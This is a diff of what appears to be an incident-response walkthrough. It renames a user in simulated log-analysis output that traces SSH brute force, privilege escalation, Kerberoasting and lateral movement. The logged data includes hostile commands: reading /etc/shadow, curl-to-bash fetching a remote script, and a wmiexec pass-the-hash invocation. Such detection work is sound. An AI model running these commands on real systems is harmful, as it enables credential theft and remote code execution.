@@ -22,14 +22,14 @@ security teams see every day in enterprise environments.
 
 ```
 14:05  Linux SSH brute force from 203.0.113.42
-       └─ 10 failed attempts (admin/root/test/postgres + 2x jbang)
-14:05:35  publickey accepted for jbang        ← stolen private key
+       └─ 10 failed attempts (admin/root/test/postgres + 2x analyst)
+14:05:35  publickey accepted for analyst        ← stolen private key
 14:07  sudo to root: cat /etc/shadow, curl | bash
 ───────────────────────────────────────
 14:10  Windows SMB brute force from 203.0.113.42
-       └─ 4 failed type-3 logons as jbang
+       └─ 4 failed type-3 logons as analyst
 14:11  Type-3 success (NTLM)                   ← cred from Linux host
-14:22  Type-10 RDP from 203.0.113.42 to WKS-JBANG
+14:22  Type-10 RDP from 203.0.113.42 to WKS-ANALYST
 14:23:00  TGT request (normal AES)
 14:24    3 × TGS requests with RC4 encryption   ← KERBEROASTING
            (MSSQL/SQL01, HTTP/exchange, LDAP/DC01)
@@ -53,13 +53,13 @@ by_logon_type:
   "5 (Service)": 1           ← service account (legit)
 
 brute_force_survivors: [
-  {user: "jbang", prior_failure_count: 4,
+  {user: "analyst", prior_failure_count: 4,
    success_ts: "14:11:30", source_ip: "203.0.113.42",
    severity: "high"}
 ]
 
 after_hours_interactive_logons: [
-  {user: "jbang", logon_type_name: "RemoteInteractive",
+  {user: "analyst", logon_type_name: "RemoteInteractive",
    ts: "2026-03-15 02:17:00", source_ip: "198.51.100.77"}
 ]
 
@@ -74,7 +74,7 @@ remote_admin_hits: 2
   {tool: "wmiexec", pid: 5200, cmdline: "python wmiexec.py -hashes :abcd ..."}
 
 suspicious_pairs: 5
-  jbang@203.0.113.42     → psexec  (Δ105s, high)
+  analyst@203.0.113.42     → psexec  (Δ105s, high)
   Administrator@10.0.0.50 → psexec  (Δ15s, high)   ← explicit-cred logon
   svc_sql@10.0.0.50       → wmiexec (Δ15s, high)   ← stolen svc account
 
@@ -88,9 +88,9 @@ max_severity: high
 stats: {kerberoasting_count: 3, asrep_roasting_count: 1}
 
 kerberoasting_candidates:
-  {user: "jbang", service: "MSSQLSvc/SQL01.corp.local", enc: "0x17" (RC4)}
-  {user: "jbang", service: "HTTP/exchange.corp.local",  enc: "0x17" (RC4)}
-  {user: "jbang", service: "LDAP/DC01.corp.local",      enc: "0x17" (RC4)}
+  {user: "analyst", service: "MSSQLSvc/SQL01.corp.local", enc: "0x17" (RC4)}
+  {user: "analyst", service: "HTTP/exchange.corp.local",  enc: "0x17" (RC4)}
+  {user: "analyst", service: "LDAP/DC01.corp.local",      enc: "0x17" (RC4)}
 
 asrep_roasting_candidates:
   {user: "alice", interpretation: "TGT with no pre-auth — AS-REP Roasting"}
@@ -110,15 +110,15 @@ brute_force_sources: [
 ]
 
 brute_force_survivors: [
-  {user: "jbang", source_ip: "203.0.113.42",
+  {user: "analyst", source_ip: "203.0.113.42",
    ts: "2026-03-15T14:05:35", severity: "critical",
    interpretation: "successful SSH after brute force from same IP"}
 ]
 
 dangerous_sudo_commands: [
-  {user: "jbang", target: "root", command: "/bin/cat /etc/shadow"},
-  {user: "jbang", target: "root", command: "/usr/bin/curl http://198.51.100.23/s.sh"},
-  {user: "jbang", target: "root", command: "/bin/bash /tmp/s.sh"}
+  {user: "analyst", target: "root", command: "/bin/cat /etc/shadow"},
+  {user: "analyst", target: "root", command: "/usr/bin/curl http://198.51.100.23/s.sh"},
+  {user: "analyst", target: "root", command: "/bin/bash /tmp/s.sh"}
 ]
 ```
 
@@ -128,21 +128,21 @@ dangerous_sudo_commands: [
 transitions: 2   critical: 2
 
 critical_transitions:
-  jbang (203.0.113.42) → root in 85s  `/bin/cat /etc/shadow`
-  jbang (203.0.113.42) → root in 100s `/usr/bin/curl http://198.51.100.23/s.sh`
+  analyst (203.0.113.42) → root in 85s  `/bin/cat /etc/shadow`
+  analyst (203.0.113.42) → root in 100s `/usr/bin/curl http://198.51.100.23/s.sh`
 ```
 
 ## Complete narrative for the incident report
 
 > On 2026-03-15, the attacker at `203.0.113.42` first compromised a Linux
-> web server via SSH brute force against user `jbang` (10 attempts in 35
+> web server via SSH brute force against user `analyst` (10 attempts in 35
 > seconds, publickey succeeded at 14:05:35 — suggesting a stolen private
 > key). Within 95 seconds they read `/etc/shadow` and downloaded a
 > secondary payload via `curl | bash`, transitioning to root.
 >
 > From the Linux foothold they pivoted to the Windows domain: 4 failed
 > SMB logons (type 3) followed by success, then RDP (type 10) at 14:22
-> to `WKS-JBANG`. At 14:24 the compromised account performed a
+> to `WKS-ANALYST`. At 14:24 the compromised account performed a
 > Kerberoasting campaign against three high-value services
 > (`MSSQLSvc/SQL01`, `HTTP/exchange`, `LDAP/DC01`), requesting service
 > tickets with RC4 encryption for offline cracking. The attacker also
